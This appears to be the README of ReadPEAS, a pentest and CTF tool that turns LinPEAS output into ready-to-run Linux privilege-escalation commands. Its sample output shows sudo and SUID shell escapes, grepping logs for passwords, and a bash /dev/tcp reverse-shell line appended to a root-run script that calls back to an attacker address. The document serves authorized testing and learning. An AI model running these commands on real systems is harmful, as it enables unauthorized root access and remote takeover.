```
  ____                _ ____  _____    _    ____  
 |  _ \ ___  __ _  __| |  _ \| ____|  / \  / ___| 
 | |_) / _ \/ _` |/ _` | |_) |  _|   / _ \ \___ \ 
 |  _ <  __/ (_| | (_| |  __/| |___ / ___ \ ___) |
 |_| \_\___|\__,_|\__,_|_|   |_____/_/   \_\____/ 
```

ReadPEAS turns LinPEAS output into one copy-paste command to root. Point it at a
LinPEAS dump and it tells you the single best privesc command to run: no AI, no
internet connection, fully offline. Built for speed in CTFs and exam scenarios
(OSCP, HTB, THM) where AI tools aren't allowed and you don't have time to scroll
through a wall of LinPEAS output.

---

## Install

```bash
git clone https://github.com/alisalive/ReadPEAS.git
cd ReadPEAS
pip install -e . --break-system-packages
```

This installs the `readpeas` command globally (editable install: no external
pip dependencies, stdlib only).

---

## Quick start

```bash
readpeas linpeas_output.txt
```

`--ip`/`--port` are **your own attacker/listener address**: they have nothing
to do with reading the LinPEAS file. They're only used to auto-fill the
`LHOST`/`LPORT` placeholders in generated exploit commands that need a
reverse-shell callback (e.g. appending a payload to a writable script). Any
finding that doesn't need a callback (kernel exploits, sudo/SUID GTFOBins
commands, etc.) ignores `--ip`/`--port` entirely.

```bash
readpeas linpeas_output.txt --ip 10.10.14.5 --port 4444
```

`-f`/`--file` still works as a deprecated alias for the file path
(`readpeas -f linpeas_output.txt`), kept for backwards compatibility.

---

## Flags

| Flag              | Description |
|-------------------|--------------|
| `file` (positional) | Path to LinPEAS output file (required, unless piping via stdin) |
| `-f`, `--file`    | Alternate way to pass the file (deprecated, still supported) |
| `--ip`            | Attacker LHOST: substituted into reverse-shell commands that need a callback |
| `--port`          | Attacker LPORT: substituted into reverse-shell commands (default: `4444`) |
| `--tldr`          | Print only the single best command, nothing else |
| `--top`           | Print up to 3 best findings, compact |
| `--all`           | Print every finding, fully decorated |
| `--only`          | Filter findings by severity (`critical`, `high`, `info`, ...) |
| `-o`, `--output`  | Output format: `terminal` (default), `json`, or `markdown` |
| `--version`       | Show version and exit |
| `-h`, `--help`    | Show usage |

---

## Real example output

Run against a real HTB Fowsniff LinPEAS dump:

```
$ readpeas fowsniff_linpeas.txt --ip 192.168.158.220 --port 4444
[CRITICAL] sudo -> vim (/usr/bin/vim)
  sudo /usr/bin/vim -c ':shell'

Run with --all to see all 5 findings.
```

Same file with `--all` (every finding, fully decorated):

```
$ readpeas fowsniff_linpeas.txt --all --ip 192.168.158.220 --port 4444
[*] OS: linux
[*] Total findings: 5

[CRITICAL] sudo -> vim (/usr/bin/vim)
TRY FIRST:
  $ sudo /usr/bin/vim -c ':shell'
Other options (11 more):
  $ sudo /usr/bin/vim -c ':!/bin/sh' /dev/null
  $ sudo /usr/bin/vim -c ':set shell=/bin/sh | shell'
  ...
------------------------------------------------------------
[CRITICAL] suid -> find (/usr/bin/find)
TRY FIRST:
  $ /usr/bin/find . -exec /bin/sh -p \; -quit
Other options (2 more):
  $ /usr/bin/find /path/to/input-file -exec cat {} \;
  $ /usr/bin/find / -fprintf /path/to/output-file DATA -quit
------------------------------------------------------------
[HIGH] capabilities -> systemd-detect-virt (/usr/bin/systemd-detect-virt)  [cap_dac_override,cap_sys_ptrace+ep]
  Note: cap_dac_override,cap_sys_ptrace+ep: can bypass file read/write permission checks. Investigate: may allow reading /etc/shadow or overwriting protected files.
No exploit commands found.
------------------------------------------------------------
[HIGH] group -> adm  adm group can read system logs - may contain passwords
TRY FIRST:
  $ grep -r 'password\|passwd\|secret' /var/log/ 2>/dev/null
Other options (1 more):
  $ cat /var/log/auth.log | grep -i 'password'
------------------------------------------------------------
[HIGH] writable_exec_script -> /opt/cube/cube.sh  (Group-writable executable script in system directory: may be called by root)
TRY FIRST:
  $ cat /etc/update-motd.d/* 2>/dev/null | grep -F '/opt/cube/cube.sh'
Other options (4 more):
  $ grep -r '/opt/cube/cube.sh' /etc/cron* /etc/rc* /etc/init.d/ 2>/dev/null
  $ # If called by root: append a reverse shell:
  $ echo 'bash -i >& /dev/tcp/192.168.158.220/4444 0>&1' >> /opt/cube/cube.sh
  $ # Then trigger by SSHing in or waiting for cron/service restart
```

Same file with `--tldr` (paste-ready command, nothing else):

```
$ readpeas fowsniff_linpeas.txt --tldr --ip 192.168.158.220 --port 4444
sudo /usr/bin/vim -c ':shell'
```

---

## Output modes

- **(default)**: shows only the single best paste-ready privesc command, picked
  by severity then a fixed module priority order. Tells you how many more
  findings exist so you know to check `--all`.
- **`--tldr`**: prints *only* that command (or manual steps), nothing else.
  Made for piping straight into a shell.
- **`--top`**: up to 3 best paste-ready findings, compact, numbered.
- **`--all`**: every finding found, fully decorated with all alternative
  commands (the original/full detail view).

`-o json` / `-o markdown` are also available for structured export.

---

## What it detects

- **sudo misconfigs**: `sudo -l` rule parsing with GTFOBins lookup, including
  the `(ALL, !root) NOPASSWD` `sudo -u#-1` bypass (CVE-2019-14287), `env_keep`
  `LD_PRELOAD`/`LD_LIBRARY_PATH` injection, and `PYTHONPATH` hijacking of a
  SETENV sudo rule.
- **SUID / GTFOBins**: SUID binaries cross-referenced against an offline
  GTFOBins database.
- **Capabilities**: exploitable Linux capabilities (`cap_setuid`,
  `cap_dac_override`, etc.) cross-referenced against GTFOBins.
- **Cron / PATH**: writable cron scripts and `cron.d` files, indirect
  cron-PATH hijacking, tar-wildcard injection in cron scripts, and world-writable
  directories in `$PATH`.
- **Kernel exploits**: curated detection for DirtyPipe (CVE-2022-0847),
  DirtyCow (CVE-2016-5195), PwnKit (CVE-2021-4034), and Baron Samedit
  (CVE-2021-3156), cross-checked against kernel/sudo version and SUID bit where
  applicable to reduce false positives from generic exploit-suggester output.
- **Groups**: dangerous group membership (docker, lxd, adm, disk, shadow,
  video) with full escape chains for docker/lxd.
- **Writable files**: `/etc/passwd`/`shadow`/`sudoers`/`crontab`, writable
  `update-motd.d` scripts, writable systemd service binaries, and group-writable
  executable scripts in system directories.
- **Credentials**: hardcoded passwords, DB connection strings, cloud
  credential files, and Ansible Vault secrets found in readable files.
- **NFS / logrotate / systemd / MySQL / Docker socket**: `no_root_squash` NFS
  exports, `logrotten`-exploitable logrotate configs, writable systemd
  unit/timer files, mysqld running as root (UDF injection), and a writable
  Docker socket.
- **SSH keys**: readable private keys, flagging whether they're encrypted.
- **screen / tmux**: the screen 4.5.0 SUID exploit (EDB-41154) and writable
  root-owned tmux sockets.

---

## Platform

ReadPEAS parses Linux LinPEAS output and runs on Linux.

---

## Testing

```bash
pip install -e .[dev] --break-system-packages
pytest tests/ -v
```

260 tests currently pass.

---

## Contributing / rebuilding the GTFOBins database

The offline GTFOBins database (`data/gtfobins.json`) is generated by:

```bash
python scripts/build_gtfobins.py
```

This shallow-clones the GTFOBins repo, parses its YAML entries, and rewrites
`data/gtfobins.json`. Requires `git`.

---

## Disclaimer

For authorized penetration testing, CTF competitions, and educational use only.
